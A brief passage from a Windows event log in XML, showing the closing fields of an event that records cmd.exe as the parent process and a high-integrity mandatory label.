      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  